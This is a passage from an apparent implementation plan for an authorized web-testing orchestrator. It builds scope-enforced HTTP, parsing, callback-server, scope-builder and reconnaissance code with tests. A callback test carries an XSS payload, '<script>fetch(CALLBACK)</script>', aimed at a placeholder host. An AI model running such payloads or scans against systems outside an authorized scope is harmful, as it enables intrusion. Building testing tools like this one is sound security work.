        if not self._scope_checker.is_in_scope(url):
            raise OutOfScopeError(f"URL out of scope: {url}")

        self._rate_limiter.acquire(url)
        merged_headers = self._build_headers(headers)

        resp = self._session.request(
            method=method,
            url=url,
            headers=merged_headers,
            data=data,
            json=json_data,
            params=params,
            timeout=timeout or self._timeout,
            allow_redirects=allow_redirects,
        )

        if resp.status_code == 429:
            self._rate_limiter.report_block(url)
        else:
            self._rate_limiter.report_success(url)

        return HttpResponse(
            status_code=resp.status_code,
            headers=dict(resp.headers),
            text=resp.text,
            content=resp.content,
            url=resp.url,
            elapsed=resp.elapsed.total_seconds(),
            request_method=method,
            request_url=url,
            request_headers=merged_headers,
            request_body=str(data) if data else None,
        )

    def get(self, url: str, **kwargs) -> HttpResponse:
        return self.request("GET", url, **kwargs)

    def post(self, url: str, **kwargs) -> HttpResponse:
        return self.request("POST", url, **kwargs)

    def put(self, url: str, **kwargs) -> HttpResponse:
        return self.request("PUT", url, **kwargs)

    def delete(self, url: str, **kwargs) -> HttpResponse:
        return self.request("DELETE", url, **kwargs)

    def options(self, url: str, **kwargs) -> HttpResponse:
        return self.request("OPTIONS", url, **kwargs)

    def head(self, url: str, **kwargs) -> HttpResponse:
        return self.request("HEAD", url, **kwargs)
```

**Step 4: Run tests**

```bash
pytest tests/test_http_utils.py -v
```

Expected: All PASS

**Step 5: Commit**

```bash
git add wstg_orchestrator/utils/http_utils.py tests/test_http_utils.py
git commit -m "feat: implement HttpClient with scope enforcement, rate limiting, and custom headers"
```

---

## Task 8: Parser Utils

**Files:**
- Create: `wstg_orchestrator/utils/parser_utils.py`
- Create: `tests/test_parser_utils.py`

**Step 1: Write failing tests**

```python
# tests/test_parser_utils.py
import pytest
from wstg_orchestrator.utils.parser_utils import (
    extract_params_from_url,
    extract_urls_from_text,
    normalize_url,
    deduplicate_urls,
    diff_responses,
    extract_forms_from_html,
    detect_id_patterns,
)


def test_extract_params_from_url():
    params = extract_params_from_url("https://example.com/search?q=test&page=1&id=42")
    assert {"q", "page", "id"} == set(params.keys())


def test_extract_urls_from_text():
    text = 'var url = "/api/users"; fetch("/api/orders/123");'
    urls = extract_urls_from_text(text)
    assert "/api/users" in urls
    assert "/api/orders/123" in urls


def test_normalize_url():
    assert normalize_url("https://Example.COM/Path/?a=1&a=1") == "https://example.com/Path/?a=1"


def test_deduplicate_urls():
    urls = [
        "https://example.com/a",
        "https://example.com/a",
        "https://example.com/b",
    ]
    assert len(deduplicate_urls(urls)) == 2


def test_diff_responses_identical():
    result = diff_responses("same body", "same body")
    assert result["identical"] is True


def test_diff_responses_different():
    result = diff_responses("body one data", "body two data")
    assert result["identical"] is False
    assert result["similarity"] < 1.0


def test_extract_forms_from_html():
    html = '<form action="/login" method="POST"><input name="user"><input name="pass" type="password"><button type="submit">Go</button></form>'
    forms = extract_forms_from_html(html)
    assert len(forms) == 1
    assert forms[0]["action"] == "/login"
    assert forms[0]["method"] == "POST"
    assert "user" in [f["name"] for f in forms[0]["inputs"]]


def test_detect_id_patterns():
    urls = [
        "https://example.com/user/123",
        "https://example.com/item/550e8400-e29b-41d4-a716-446655440000",
        "https://example.com/about",
    ]
    result = detect_id_patterns(urls)
    assert any(r["type"] == "numeric" for r in result)
    assert any(r["type"] == "uuid" for r in result)
```

**Step 2: Run tests to verify they fail**

```bash
pytest tests/test_parser_utils.py -v
```

**Step 3: Implement parser_utils**

```python
# wstg_orchestrator/utils/parser_utils.py
import re
from difflib import SequenceMatcher
from html.parser import HTMLParser
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse


def extract_params_from_url(url: str) -> dict[str, str]:
    parsed = urlparse(url)
    params = parse_qs(parsed.query)
    return {k: v[0] if len(v) == 1 else v for k, v in params.items()}


def extract_urls_from_text(text: str) -> list[str]:
    patterns = [
        r'["\'](/[a-zA-Z0-9_/\-\.]+(?:\?[^"\']*)?)["\']',
        r'["\']((https?://)[a-zA-Z0-9_/\-\.]+(?:\?[^"\']*)?)["\']',
    ]
    urls = []
    for pattern in patterns:
        for match in re.finditer(pattern, text):
            urls.append(match.group(1))
    return list(set(urls))


def normalize_url(url: str) -> str:
    parsed = urlparse(url)
    params = parse_qs(parsed.query)
    deduped = {k: v[0] for k, v in params.items()}
    normalized_query = urlencode(deduped) if deduped else ""
    return urlunparse((
        parsed.scheme.lower(),
        parsed.netloc.lower(),
        parsed.path,
        parsed.params,
        normalized_query,
        "",
    ))


def deduplicate_urls(urls: list[str]) -> list[str]:
    seen = set()
    result = []
    for url in urls:
        norm = normalize_url(url)
        if norm not in seen:
            seen.add(norm)
            result.append(url)
    return result


def diff_responses(body_a: str, body_b: str) -> dict:
    ratio = SequenceMatcher(None, body_a, body_b).ratio()
    return {
        "identical": body_a == body_b,
        "similarity": ratio,
        "length_diff": len(body_b) - len(body_a),
    }


class _FormParser(HTMLParser):
    def __init__(self):
        super().__init__()
        self.forms = []
        self._current_form = None

    def handle_starttag(self, tag, attrs):
        attrs_dict = dict(attrs)
        if tag == "form":
            self._current_form = {
                "action": attrs_dict.get("action", ""),
                "method": attrs_dict.get("method", "GET").upper(),
                "inputs": [],
            }
        elif tag == "input" and self._current_form is not None:
            self._current_form["inputs"].append({
                "name": attrs_dict.get("name", ""),
                "type": attrs_dict.get("type", "text"),
                "value": attrs_dict.get("value", ""),
            })

    def handle_endtag(self, tag):
        if tag == "form" and self._current_form is not None:
            self.forms.append(self._current_form)
            self._current_form = None


def extract_forms_from_html(html: str) -> list[dict]:
    parser = _FormParser()
    parser.feed(html)
    return parser.forms


_UUID_RE = re.compile(r'[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}', re.I)
_NUMERIC_ID_RE = re.compile(r'/(\d{1,10})(?:/|$|\?)')


def detect_id_patterns(urls: list[str]) -> list[dict]:
    results = []
    for url in urls:
        for match in _UUID_RE.finditer(url):
            results.append({"url": url, "type": "uuid", "value": match.group()})
        for match in _NUMERIC_ID_RE.finditer(url):
            results.append({"url": url, "type": "numeric", "value": match.group(1)})
    return results
```

**Step 4: Run tests**

```bash
pytest tests/test_parser_utils.py -v
```

Expected: All PASS

**Step 5: Commit**

```bash
git add wstg_orchestrator/utils/parser_utils.py tests/test_parser_utils.py
git commit -m "feat: implement parser utils for URL extraction, form parsing, and ID detection"
```

---

## Task 9: Callback Server

**Files:**
- Create: `wstg_orchestrator/utils/callback_server.py`
- Create: `tests/test_callback_server.py`

**Step 1: Write failing tests**

```python
# tests/test_callback_server.py
import asyncio
import threading
import time
import pytest
import requests
from wstg_orchestrator.utils.callback_server import CallbackServer


@pytest.fixture
def server():
    srv = CallbackServer(host="127.0.0.1", port=0)  # port=0 for random available port
    srv.start()
    time.sleep(0.3)
    yield srv
    srv.stop()


def test_generate_callback_url(server):
    url, token = server.generate_callback(
        module="input_validation",
        parameter="q",
        payload="<script>fetch(CALLBACK)</script>",
    )
    assert token in url
    assert server.host in url or "127.0.0.1" in url


def test_callback_hit_recorded(server):
    url, token = server.generate_callback(
        module="input_validation",
        parameter="q",
        payload="test_payload",
    )
    requests.get(url, timeout=5)
    time.sleep(0.3)
    hits = server.get_hits()
    assert len(hits) >= 1
    assert hits[0]["token"] == token
    assert hits[0]["module"] == "input_validation"


def test_pending_callbacks_tracked(server):
    _, token = server.generate_callback(
        module="recon", parameter="x", payload="p",
    )
    pending = server.get_pending()
    assert any(p["token"] == token for p in pending)


def test_hit_moves_from_pending(server):
    url, token = server.generate_callback(
        module="recon", parameter="x", payload="p",
    )
    requests.get(url, timeout=5)
    time.sleep(0.3)
    pending = server.get_pending()
    assert not any(p["token"] == token for p in pending)
```

**Step 2: Run tests to verify they fail**

```bash
pytest tests/test_callback_server.py -v
```

**Step 3: Implement CallbackServer**

```python
# wstg_orchestrator/utils/callback_server.py
import json
import logging
import socket
import threading
import uuid
from datetime import datetime, timezone
from http.server import HTTPServer, BaseHTTPRequestHandler

logger = logging.getLogger(__name__)


class CallbackServer:
    def __init__(self, host: str = "0.0.0.0", port: int = 8443, external_url: str | None = None):
        self.host = host
        self.port = port
        self._external_url = external_url
        self._pending: dict[str, dict] = {}
        self._hits: list[dict] = []
        self._lock = threading.Lock()
        self._server: HTTPServer | None = None
        self._thread: threading.Thread | None = None

    def start(self):
        server_ref = self

        class Handler(BaseHTTPRequestHandler):
            def do_GET(self):
                token = self.path.strip("/").split("/")[-1].split("?")[0]
                server_ref._record_hit(token, self)
                self.send_response(200)
                self.send_header("Content-Type", "text/plain")
                self.end_headers()
                self.wfile.write(b"OK")

            def do_POST(self):
                content_length = int(self.headers.get("Content-Length", 0))
                body = self.rfile.read(content_length).decode("utf-8", errors="replace")
                token = self.path.strip("/").split("/")[-1].split("?")[0]
                server_ref._record_hit(token, self, body=body)
                self.send_response(200)
                self.send_header("Content-Type", "text/plain")
                self.end_headers()
                self.wfile.write(b"OK")

            def log_message(self, format, *args):
                logger.debug(f"Callback server: {format % args}")

        self._server = HTTPServer((self.host, self.port), Handler)
        if self.port == 0:
            self.port = self._server.server_address[1]
        self._thread = threading.Thread(target=self._server.serve_forever, daemon=True)
        self._thread.start()
        logger.info(f"Callback server started on {self.host}:{self.port}")

    def stop(self):
        if self._server:
            self._server.shutdown()
            self._server = None

    def generate_callback(self, module: str, parameter: str, payload: str) -> tuple[str, str]:
        token = str(uuid.uuid4()).replace("-", "")[:16]
        base = self._external_url or f"http://{self._get_host()}:{self.port}"
        url = f"{base}/{token}"
        entry = {
            "token": token,
            "module": module,
            "parameter": parameter,
            "payload": payload,
            "created": datetime.now(timezone.utc).isoformat(),
        }
        with self._lock:
            self._pending[token] = entry
        return url, token

    def _get_host(self) -> str:
        if self.host == "0.0.0.0":
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                s.connect(("8.8.8.8", 80))
                ip = s.getsockname()[0]
                s.close()
                return ip
            except Exception:
                return "127.0.0.1"
        return self.host

    def _record_hit(self, token: str, handler, body: str | None = None):
        with self._lock:
            pending = self._pending.pop(token, None)
            hit = {
                "token": token,
                "module": pending["module"] if pending else "unknown",
                "parameter": pending["parameter"] if pending else "unknown",
                "payload": pending["payload"] if pending else "unknown",
                "source_ip": handler.client_address[0],
                "method": handler.command,
                "path": handler.path,
                "headers": dict(handler.headers),
                "body": body,
                "timestamp": datetime.now(timezone.utc).isoformat(),
            }
            self._hits.append(hit)
            logger.info(f"Callback hit! Token: {token}, Module: {hit['module']}")

    def get_hits(self) -> list[dict]:
        with self._lock:
            return list(self._hits)

    def get_pending(self) -> list[dict]:
        with self._lock:
            return list(self._pending.values())
```

**Step 4: Run tests**

```bash
pytest tests/test_callback_server.py -v
```

Expected: All PASS

**Step 5: Commit**

```bash
git add wstg_orchestrator/utils/callback_server.py tests/test_callback_server.py
git commit -m "feat: implement CallbackServer for blind exploit confirmation"
```

---

## Task 10: Interactive Scope Builder

**Files:**
- Create: `wstg_orchestrator/scope_builder.py`
- Create: `tests/test_scope_builder.py`

**Step 1: Write failing tests**

```python
# tests/test_scope_builder.py
import os
import tempfile
import pytest
import yaml
from unittest.mock import patch
from wstg_orchestrator.scope_builder import ScopeBuilder


def test_build_config_from_inputs():
    inputs = iter([
        "TestCorp",                          # company name
        "testcorp.com",                      # base domain
        "app.testcorp.com, api.testcorp.com",# in-scope urls
        "",                                  # in-scope ips
        "admin.testcorp.com",                # out-of-scope urls
        "10.0.0.1",                          # out-of-scope ips
        "dos, social_engineering",           # out-of-scope attack vectors
        "10",                                # rate limit
        "X-Bug-Bounty: testcorp-123",        # custom headers
        "",                                  # auth profiles (skip)
        "",                                  # callback host (default)
        "",                                  # callback port (default)
        "No destructive testing allowed",    # notes
    ])
    with patch("builtins.input", lambda prompt="": next(inputs)):
        builder = ScopeBuilder()
        config = builder.build()

    assert config["program_scope"]["company_name"] == "TestCorp"
    assert config["program_scope"]["base_domain"] == "testcorp.com"
    assert "app.testcorp.com" in config["program_scope"]["in_scope_urls"]
    assert "admin.testcorp.com" in config["program_scope"]["out_of_scope_urls"]
    assert "dos" in config["program_scope"]["out_of_scope_attack_vectors"]
    assert config["program_scope"]["rate_limit"] == 10
    assert config["program_scope"]["custom_headers"]["X-Bug-Bounty"] == "testcorp-123"


def test_save_config():
    with tempfile.TemporaryDirectory() as d:
        path = os.path.join(d, "config.yaml")
        config_data = {
            "program_scope": {"company_name": "Test", "base_domain": "test.com"},
        }
        ScopeBuilder.save_config(config_data, path)
        assert os.path.exists(path)
        with open(path) as f:
            loaded = yaml.safe_load(f)
        assert loaded["program_scope"]["company_name"] == "Test"
```

**Step 2: Run tests to verify they fail**

```bash
pytest tests/test_scope_builder.py -v
```

**Step 3: Implement ScopeBuilder**

```python
# wstg_orchestrator/scope_builder.py
import yaml


class ScopeBuilder:
    def build(self) -> dict:
        print("\n=== WSTG Orchestrator - Scope Builder ===\n")

        company_name = input("Company name: ").strip()
        base_domain = input("Base domain (e.g., example.com): ").strip()

        in_scope_urls = self._parse_list(
            input("In-scope URLs (comma-separated, or empty): ")
        )
        in_scope_ips = self._parse_list(
            input("In-scope IPs (comma-separated, or empty): ")
        )
        out_of_scope_urls = self._parse_list(
            input("Out-of-scope URLs (comma-separated, or empty): ")
        )
        out_of_scope_ips = self._parse_list(
            input("Out-of-scope IPs (comma-separated, or empty): ")
        )
        out_of_scope_attack_vectors = self._parse_list(
            input("Out-of-scope attack vectors (e.g., dos, social_engineering): ")
        )

        rate_limit_raw = input("Rate limit (requests/sec, default 10): ").strip()
        rate_limit = int(rate_limit_raw) if rate_limit_raw else 10

        headers_raw = input("Custom headers (Key: Value, comma-separated, or empty): ").strip()
        custom_headers = self._parse_headers(headers_raw)

        auth_raw = input("Auth profile (type:credential, or empty to skip): ").strip()
        auth_profiles = {}
        if auth_raw:
            auth_profiles = self._parse_auth(auth_raw)

        callback_host = input("Callback server host (default 0.0.0.0): ").strip() or "0.0.0.0"
        callback_port_raw = input("Callback server port (default 8443): ").strip()
        callback_port = int(callback_port_raw) if callback_port_raw else 8443

        notes = input("Additional notes: ").strip()

        return {
            "program_scope": {
                "company_name": company_name,
                "base_domain": base_domain,
                "wildcard_urls": [f"*.{base_domain}"],
                "in_scope_urls": in_scope_urls,
                "in_scope_ips": in_scope_ips,
                "out_of_scope_urls": out_of_scope_urls,
                "out_of_scope_ips": out_of_scope_ips,
                "out_of_scope_attack_vectors": out_of_scope_attack_vectors,
                "rate_limit": rate_limit,
                "custom_headers": custom_headers,
                "notes": notes,
            },
            "auth_profiles": auth_profiles,
            "tool_configs": {},
            "callback_server": {
                "host": callback_host,
                "port": callback_port,
            },
        }

    def _parse_list(self, raw: str) -> list[str]:
        if not raw.strip():
            return []
        return [item.strip() for item in raw.split(",") if item.strip()]

    def _parse_headers(self, raw: str) -> dict:
        if not raw:
            return {}
        headers = {}
        for item in raw.split(","):
            if ":" in item:
                key, value = item.split(":", 1)
                headers[key.strip()] = value.strip()
        return headers

    def _parse_auth(self, raw: str) -> dict:
        if ":" in raw:
            auth_type, credential = raw.split(":", 1)
            return {
                "default": {
                    "type": auth_type.strip(),
                    "token": credential.strip(),
                }
            }
        return {}

    @staticmethod
    def save_config(config: dict, path: str):
        with open(path, "w") as f:
            yaml.dump(config, f, default_flow_style=False, sort_keys=False)
```

**Step 4: Run tests**

```bash
pytest tests/test_scope_builder.py -v
```

Expected: All PASS

**Step 5: Commit**

```bash
git add wstg_orchestrator/scope_builder.py tests/test_scope_builder.py
git commit -m "feat: implement interactive ScopeBuilder for config.yaml generation"
```

---

## Task 11: Module Base Interface

**Files:**
- Create: `wstg_orchestrator/modules/base_module.py`
- Create: `tests/test_base_module.py`

**Step 1: Write failing tests**

```python
# tests/test_base_module.py
import pytest
from unittest.mock import MagicMock
from wstg_orchestrator.modules.base_module import BaseModule


class DummyModule(BaseModule):
    PHASE_NAME = "test_phase"
    SUBCATEGORIES = ["sub_a", "sub_b"]
    EVIDENCE_SUBDIRS = ["tool_output", "parsed"]

    async def execute(self):
        self.state.enrich("endpoints", ["https://example.com/test"])
        self.mark_subcategory_complete("sub_a")
        self.mark_subcategory_complete("sub_b")


def test_module_has_required_attrs():
    assert hasattr(BaseModule, "PHASE_NAME")
    assert hasattr(BaseModule, "SUBCATEGORIES")


def test_module_interface():
    state = MagicMock()
    config = MagicMock()
    scope = MagicMock()
    limiter = MagicMock()
    evidence = MagicMock()
    callback = MagicMock()

    mod = DummyModule(state, config, scope, limiter, evidence, callback)
    assert mod.PHASE_NAME == "test_phase"


def test_skip_completed_subcategory():
    state = MagicMock()
    state.is_subcategory_complete.return_value = True
    config = MagicMock()
    scope = MagicMock()
    limiter = MagicMock()
    evidence = MagicMock()
    callback = MagicMock()

    mod = DummyModule(state, config, scope, limiter, evidence, callback)
    assert mod.should_skip_subcategory("sub_a") is True


def test_attack_vector_check():
    state = MagicMock()
    config = MagicMock()
    scope = MagicMock()
    scope.is_attack_vector_allowed.return_value = False
    limiter = MagicMock()
    evidence = MagicMock()
    callback = MagicMock()

    mod = DummyModule(state, config, scope, limiter, evidence, callback)
    assert mod.is_attack_allowed("dos") is False
```

**Step 2: Run tests to verify they fail**

```bash
pytest tests/test_base_module.py -v
```

**Step 3: Implement BaseModule**

```python
# wstg_orchestrator/modules/base_module.py
import logging
from abc import ABC, abstractmethod

from wstg_orchestrator.state_manager import StateManager
from wstg_orchestrator.utils.config_loader import ConfigLoader
from wstg_orchestrator.utils.scope_checker import ScopeChecker
from wstg_orchestrator.utils.rate_limit_handler import RateLimiter
from wstg_orchestrator.utils.evidence_logger import EvidenceLogger
from wstg_orchestrator.utils.callback_server import CallbackServer


class BaseModule(ABC):
    PHASE_NAME: str = ""
    SUBCATEGORIES: list[str] = []
    EVIDENCE_SUBDIRS: list[str] = []

    def __init__(
        self,
        state: StateManager,
        config: ConfigLoader,
        scope_checker: ScopeChecker,
        rate_limiter: RateLimiter,
        evidence_logger: EvidenceLogger,
        callback_server: CallbackServer,
    ):
        self.state = state
        self.config = config
        self.scope = scope_checker
        self.rate_limiter = rate_limiter
        self.evidence = evidence_logger
        self.callback = callback_server
        self.logger = logging.getLogger(f"wstg.{self.PHASE_NAME}")

    @abstractmethod
    async def execute(self):
        pass

    async def run(self):
        if self.state.is_phase_complete(self.PHASE_NAME):
            self.logger.info(f"Phase {self.PHASE_NAME} already complete, skipping")
            return
        self.logger.info(f"Starting phase: {self.PHASE_NAME}")
        await self.execute()
        self.state.mark_phase_complete(self.PHASE_NAME)
        self.logger.info(f"Completed phase: {self.PHASE_NAME}")

    def should_skip_subcategory(self, subcategory: str) -> bool:
        return self.state.is_subcategory_complete(self.PHASE_NAME, subcategory)

    def mark_subcategory_complete(self, subcategory: str):
        self.state.mark_subcategory_complete(self.PHASE_NAME, subcategory)

    def is_attack_allowed(self, vector: str) -> bool:
        return self.scope.is_attack_vector_allowed(vector)
```

**Step 4: Run tests**

```bash
pytest tests/test_base_module.py -v
```

Expected: All PASS

**Step 5: Commit**

```bash
git add wstg_orchestrator/modules/base_module.py tests/test_base_module.py
git commit -m "feat: implement BaseModule ABC with resume, scope, and attack vector checks"
```

---

## Task 12: Main Orchestrator

**Files:**
- Create: `wstg_orchestrator/main.py`
- Create: `tests/test_main.py`

**Step 1: Write failing tests**

```python
# tests/test_main.py
import os
import tempfile
import pytest
import yaml
from unittest.mock import patch, MagicMock, AsyncMock
from wstg_orchestrator.main import Orchestrator


@pytest.fixture
def tmp_dir():
    with tempfile.TemporaryDirectory() as d:
        yield d


@pytest.fixture
def config_file(tmp_dir):
    config = {
        "program_scope": {
            "company_name": "TestCorp",
            "base_domain": "testcorp.com",
            "wildcard_urls": ["*.testcorp.com"],
            "in_scope_urls": [],
            "in_scope_ips": [],
            "out_of_scope_urls": [],
            "out_of_scope_ips": [],
            "out_of_scope_attack_vectors": [],
            "rate_limit": 50,
            "custom_headers": {},
            "notes": "",
        },
        "auth_profiles": {},
        "tool_configs": {},
        "callback_server": {"host": "127.0.0.1", "port": 0},
    }
    path = os.path.join(tmp_dir, "config.yaml")
    with open(path, "w") as f:
        yaml.dump(config, f)
    return path


def test_orchestrator_init(config_file, tmp_dir):
    orch = Orchestrator(
        config_path=config_file,
        state_path=os.path.join(tmp_dir, "state.json"),
        evidence_dir=os.path.join(tmp_dir, "evidence"),
    )
    assert orch.config.company_name == "TestCorp"
    assert orch.state.get("target_domain") == "testcorp.com"


def test_orchestrator_creates_evidence_dir(config_file, tmp_dir):
    orch = Orchestrator(
        config_path=config_file,
        state_path=os.path.join(tmp_dir, "state.json"),
        evidence_dir=os.path.join(tmp_dir, "evidence"),
    )
    assert os.path.isdir(os.path.join(tmp_dir, "evidence", "TestCorp"))


def test_orchestrator_module_order(config_file, tmp_dir):
    orch = Orchestrator(
        config_path=config_file,
        state_path=os.path.join(tmp_dir, "state.json"),
        evidence_dir=os.path.join(tmp_dir, "evidence"),
    )
    order = orch.get_execution_order()
    assert order[0] == "reconnaissance"
    assert "fingerprinting" in order
    assert order.index("reconnaissance") < order.index("input_validation")
```

**Step 2: Run tests to verify they fail**

```bash
pytest tests/test_main.py -v
```

**Step 3: Implement Orchestrator**

```python
# wstg_orchestrator/main.py
import argparse
import asyncio
import logging
import os
import sys

from wstg_orchestrator.state_manager import StateManager
from wstg_orchestrator.utils.config_loader import ConfigLoader
from wstg_orchestrator.utils.scope_checker import ScopeChecker
from wstg_orchestrator.utils.rate_limit_handler import RateLimiter
from wstg_orchestrator.utils.evidence_logger import EvidenceLogger
from wstg_orchestrator.utils.callback_server import CallbackServer
from wstg_orchestrator.utils.command_runner import CommandRunner
from wstg_orchestrator.scope_builder import ScopeBuilder

logger = logging.getLogger("wstg.orchestrator")

PHASE_EVIDENCE_SUBDIRS = {
    "reconnaissance": ["tool_output", "parsed", "evidence", "screenshots"],
    "fingerprinting": [
        "tool_output", "raw_requests", "raw_responses", "parsed",
        "evidence", "potential_exploits", "confirmed_exploits", "screenshots",
    ],
    "configuration_testing": [
        "tool_output", "raw_requests", "raw_responses", "parsed",
        "evidence", "potential_exploits", "confirmed_exploits", "screenshots",
    ],
    "auth_testing": [
        "tool_output", "raw_requests", "raw_responses", "parsed",
        "evidence", "potential_exploits", "confirmed_exploits", "screenshots",
    ],
    "authorization_testing": [
        "tool_output", "raw_requests", "raw_responses", "parsed",
        "evidence", "potential_exploits", "confirmed_exploits", "screenshots",
    ],
    "session_testing": [
        "tool_output", "raw_requests", "raw_responses", "parsed",
        "evidence", "potential_exploits", "confirmed_exploits", "screenshots",
    ],
    "input_validation": [
        "tool_output", "raw_requests", "raw_responses", "parsed",
        "evidence", "potential_exploits", "confirmed_exploits", "screenshots",
    ],
    "business_logic": [
        "tool_output", "raw_requests", "raw_responses", "parsed",
        "evidence", "potential_exploits", "confirmed_exploits", "screenshots",
    ],
    "api_testing": [
        "tool_output", "raw_requests", "raw_responses", "parsed",
        "evidence", "potential_exploits", "confirmed_exploits", "screenshots",
    ],
}

EXECUTION_ORDER = [
    "reconnaissance",
    "fingerprinting",
    "configuration_testing",
    "auth_testing",
    "authorization_testing",
    "session_testing",
    "input_validation",
    "business_logic",
    "api_testing",
]

# Phases that can run in parallel (after their dependency completes)
PARALLEL_GROUPS = [
    ["fingerprinting", "configuration_testing"],
    ["authorization_testing", "session_testing"],
]


class Orchestrator:
    def __init__(
        self,
        config_path: str,
        state_path: str = "state.json",
        evidence_dir: str = "evidence",
    ):
        self.config = ConfigLoader(config_path)
        self.state = StateManager(
            state_path,
            target_domain=self.config.base_domain,
            company_name=self.config.company_name,
        )
        self.scope_checker = self.config.create_scope_checker()
        self.rate_limiter = RateLimiter(
            requests_per_second=self.config.rate_limit,
            base_domain=self.config.base_domain,
        )
        self.evidence_logger = EvidenceLogger(
            evidence_dir, self.config.company_name, PHASE_EVIDENCE_SUBDIRS,
        )
        self.callback_server = CallbackServer(
            host=self.config.callback_host,
            port=self.config.callback_port,
        )
        self.command_runner = CommandRunner(
            tool_configs={
                name: self.config.get_tool_config(name)
                for name in ["nmap", "subfinder", "amass", "gau", "httpx",
                             "gobuster", "whatweb", "sqlmap", "commix",
                             "kiterunner"]
            }
        )
        self._modules = {}

    def get_execution_order(self) -> list[str]:
        return list(EXECUTION_ORDER)

    def _check_tools(self):
        tools = [
            "nmap", "subfinder", "amass", "gau", "httpx",
            "gobuster", "whatweb", "sqlmap", "commix",
        ]
        for tool in tools:
            if self.command_runner.is_tool_available(tool):
                logger.info(f"Tool available: {tool}")
            else:
                logger.warning(f"Tool not found: {tool} (will use fallback if available)")

    async def run(self):
        logger.info(f"Starting WSTG scan for {self.config.company_name}")
        logger.info(f"Target domain: {self.config.base_domain}")

        self._check_tools()
        self.callback_server.start()

        try:
            for phase_name in EXECUTION_ORDER:
                if self.state.is_phase_complete(phase_name):
                    logger.info(f"Skipping completed phase: {phase_name}")
                    continue

                module = self._get_module(phase_name)
                if module:
                    await module.run()
                else:
                    logger.warning(f"No module registered for phase: {phase_name}")
        finally:
            self.callback_server.stop()
            self.state.save()
            logger.info("Scan complete")

    def _get_module(self, phase_name: str):
        return self._modules.get(phase_name)

    def register_module(self, phase_name: str, module):
        self._modules[phase_name] = module


def main():
    parser = argparse.ArgumentParser(description="WSTG Orchestrator")
    parser.add_argument("-c", "--config", default="config.yaml", help="Config file path")
    parser.add_argument("-s", "--state", default="state.json", help="State file path")
    parser.add_argument("-e", "--evidence", default="evidence", help="Evidence directory")
    parser.add_argument("--new", action="store_true", help="Run interactive scope builder")
    parser.add_argument("-v", "--verbose", action="store_true", help="Verbose logging")
    args = parser.parse_args()

    logging.basicConfig(
        level=logging.DEBUG if args.verbose else logging.INFO,
        format="%(asctime)s [%(name)s] %(levelname)s: %(message)s",
    )

    if args.new or not os.path.exists(args.config):
        builder = ScopeBuilder()
        config_data = builder.build()
        ScopeBuilder.save_config(config_data, args.config)
        logger.info(f"Config saved to {args.config}")

    orch = Orchestrator(
        config_path=args.config,
        state_path=args.state,
        evidence_dir=args.evidence,
    )

    # TODO: Register actual modules here as they are implemented
    # from wstg_orchestrator.modules.reconnaissance import ReconModule
    # orch.register_module("reconnaissance", ReconModule(orch.state, orch.config, ...))

    asyncio.run(orch.run())


if __name__ == "__main__":
    main()
```

**Step 4: Run tests**

```bash
pytest tests/test_main.py -v
```

Expected: All PASS

**Step 5: Commit**

```bash
git add wstg_orchestrator/main.py tests/test_main.py
git commit -m "feat: implement main Orchestrator with phase execution, resume, and CLI"
```

---

## Task 13: Reconnaissance Module

**Files:**
- Create: `wstg_orchestrator/modules/reconnaissance.py`
- Create: `tests/test_reconnaissance.py`

**Step 1: Write failing tests**

```python
# tests/test_reconnaissance.py
import pytest
from unittest.mock import MagicMock, AsyncMock, patch
from wstg_orchestrator.modules.reconnaissance import ReconModule


@pytest.fixture
def recon_module():
    state = MagicMock()
    state.get.return_value = []
    state.is_phase_complete.return_value = False
    state.is_subcategory_complete.return_value = False
    config = MagicMock()
    config.base_domain = "example.com"
    config.get_tool_config.return_value = {}
    scope = MagicMock()
    scope.is_in_scope.return_value = True
    limiter = MagicMock()
    evidence = MagicMock()
    evidence.log_tool_output.return_value = "/tmp/test"
    evidence.log_parsed.return_value = "/tmp/test"
    callback = MagicMock()
    return ReconModule(state, config, scope, limiter, evidence, callback)


def test_phase_name(recon_module):
    assert recon_module.PHASE_NAME == "reconnaissance"


def test_subcategories(recon_module):
    assert "passive_osint" in recon_module.SUBCATEGORIES
    assert "live_host_validation" in recon_module.SUBCATEGORIES
    assert "parameter_harvesting" in recon_module.SUBCATEGORIES


@pytest.mark.asyncio
async def test_passive_osint_runs_subfinder(recon_module):
    with patch.object(recon_module, '_run_subfinder', new_callable=AsyncMock, return_value=["sub.example.com"]):
        with patch.object(recon_module, '_run_gau', new_callable=AsyncMock, return_value=[]):
            with patch.object(recon_module, '_run_wayback', new_callable=AsyncMock, return_value=[]):
                await recon_module._passive_osint()
                recon_module.state.enrich.assert_any_call("discovered_subdomains", ["sub.example.com"])


@pytest.mark.asyncio
async def test_scope_filter_applied(recon_module):
    recon_module.scope.is_in_scope.side_effect = lambda url: "example.com" in url
    filtered = recon_module._filter_in_scope(["a.example.com", "evil.com"])
    assert filtered == ["a.example.com"]
```

**Step 2: Run tests to verify they fail**

```bash
pip install pytest-asyncio && pytest tests/test_reconnaissance.py -v
```

**Step 3: Implement ReconModule**

```python
# wstg_orchestrator/modules/reconnaissance.py
import asyncio
import re
from urllib.parse import urlparse, parse_qs

from wstg_orchestrator.modules.base_module import BaseModule
from wstg_orchestrator.utils.command_runner import CommandRunner
from wstg_orchestrator.utils.parser_utils import (
    extract_params_from_url,
    extract_urls_from_text,
    detect_id_patterns,
)


class ReconModule(BaseModule):
    PHASE_NAME = "reconnaissance"
    SUBCATEGORIES = ["passive_osint", "live_host_validation", "parameter_harvesting"]
    EVIDENCE_SUBDIRS = ["tool_output", "parsed", "evidence", "screenshots"]

    def __init__(self, *args, **kwargs):
        super().__init__(*args, **kwargs)
        self._cmd = CommandRunner(
            tool_configs={
                name: self.config.get_tool_config(name)
                for name in ["subfinder", "amass", "gau", "httpx"]
            }
        )

    async def execute(self):
        if not self.should_skip_subcategory("passive_osint"):
            await self._passive_osint()
            self.mark_subcategory_complete("passive_osint")

        if not self.should_skip_subcategory("live_host_validation"):
            await self._live_host_validation()
            self.mark_subcategory_complete("live_host_validation")

        if not self.should_skip_subcategory("parameter_harvesting"):
            await self._parameter_harvesting()
            self.mark_subcategory_complete("parameter_harvesting")

    async def _passive_osint(self):
        self.logger.info("Starting passive OSINT")
        all_subdomains = []

        subfinder_results = await self._run_subfinder()
        all_subdomains.extend(subfinder_results)

        gau_results = await self._run_gau()
        wayback_results = await self._run_wayback()
        all_urls = gau_results + wayback_results

        # Extract subdomains from URLs
        for url in all_urls:
